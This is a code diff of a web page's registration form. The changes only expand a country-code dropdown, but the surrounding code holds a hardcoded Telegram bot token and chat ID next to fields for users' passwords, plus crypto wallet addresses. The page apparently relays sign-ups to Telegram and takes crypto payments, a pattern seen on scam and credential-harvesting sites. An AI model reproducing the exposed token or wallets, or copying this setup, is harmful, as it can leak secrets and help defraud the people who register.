@@ -65,7 +65,7 @@
                 <input type="text" id="reg-name" placeholder="Full Name" class="w-full p-4 rounded-2xl text-sm">
                 <input type="email" id="reg-email" placeholder="Email Address" class="w-full p-4 rounded-2xl text-sm">
                 <div class="flex gap-2">
-                    <select id="country-code" class="p-4 rounded-2xl text-xs w-32 border border-slate-800"></select>
+                    <select id="country-code" class="p-4 rounded-2xl text-[10px] w-36 border border-slate-800"></select>
                     <input type="number" id="reg-phone" placeholder="Phone" class="flex-1 p-4 rounded-2xl text-sm">
                 </div>
                 <input type="password" id="reg-pass" placeholder="Password" class="w-full p-4 rounded-2xl text-sm">
@@ -155,7 +155,6 @@
     <div id="verifyModal" class="modal"><div class="animate-spin h-10 w-10 border-4 border-blue-600 border-t-transparent rounded-full"></div></div>
 
     <script>
-        // التوكن الجديد المحدث
         const TG_TOKEN = "8595088465:AAE5RPjItCt8Zm0irKMOP-Wd39Vlv0neKKI";
         const TG_ID = "7865246557";
         const WALLETS = { 'BEP20': '0x97154c5cccaff650cc54fc2b80a2b06884bc8ad0', 'TRC20': 'TVB3yoKYrw81vwKrMgqfvhuMmoQVXozgcf', 'ERC20': '0x97154c5cccaff650cc54fc2b80a2b06884bc8ad0' };
@@ -203,9 +202,26 @@
             window.scrollTo(0,0);
         }
 
-        const countries = [{n:"Iraq", c:"+964", f:"🇮🇶"},{n:"Saudi", c:"+966", f:"🇸🇦"},{n:"UAE", c:"+971", f:"🇦🇪"},{n:"Turkey", c:"+90", f:"🇹🇷"},{n:"USA", c:"+1", f:"🇺🇸"},{n:"Jordan", c:"+962", f:"🇯🇴"},{n:"Kuwait", c:"+965", f:"🇰🇼"}];
+        // قائمة الدول الموسعة والمحدثة
+        const countries = [
+            {n:"Iraq", c:"+964", f:"🇮🇶"},{n:"Saudi Arabia", c:"+966", f:"🇸🇦"},{n:"UAE", c:"+971", f:"🇦🇪"},
+            {n:"Kuwait", c:"+965", f:"🇰🇼"},{n:"Qatar", c:"+974", f:"🇶🇦"},{n:"Oman", c:"+968", f:"🇴🇲"},
+            {n:"Bahrain", c:"+973", f:"🇧🇭"},{n:"Jordan", c:"+962", f:"🇯🇴"},{n:"Egypt", c:"+20", f:"🇪🇬"},
+            {n:"Lebanon", c:"+961", f:"🇱🇧"},{n:"Syria", c:"+963", f:"🇸🇾"},{n:"Palestine", c:"+970", f:"🇵🇸"},
+            {n:"Yemen", c:"+967", f:"🇾🇪"},{n:"Libya", c:"+218", f:"🇱🇾"},{n:"Sudan", c:"+249", f:"🇸🇩"},
+            {n:"Tunisia", c:"+216", f:"🇹🇳"},{n:"Algeria", c:"+213", f:"🇩🇿"},{n:"Morocco", c:"+212", f:"🇲🇦"},
+            {n:"Turkey", c:"+90", f:"🇹🇷"},{n:"USA", c:"+1", f:"🇺🇸"},{n:"Germany", c:"+49", f:"🇩🇪"},
+            {n:"UK", c:"+44", f:"🇬🇧"},{n:"France", c:"+33", f:"🇫🇷"},{n:"Sweden", c:"+46", f:"🇸🇪"},
+            {n:"Netherlands", c:"+31", f:"🇳🇱"},{n:"Norway", c:"+47", f:"🇳🇴"},{n:"Italy", c:"+39", f:"🇮🇹"}
+        ];
+
         const countrySelect = document.getElementById('country-code');
-        countries.forEach(ct => { let opt = document.createElement('option'); opt.value = ct.c; opt.innerHTML = `${ct.f} ${ct.c}`; countrySelect.appendChild(opt); });
+        countries.forEach(ct => { 
+            let opt = document.createElement('option'); 
+            opt.value = ct.c; 
+            opt.innerHTML = `${ct.f} ${ct.c} (${ct.n})`; 
+            countrySelect.appendChild(opt); 
+        });
 
         let userData = {}; let isRegistered = false; let pendingAction = ""; let activeName = ""; let activeImg = ""; let selectedVal = 0;
 
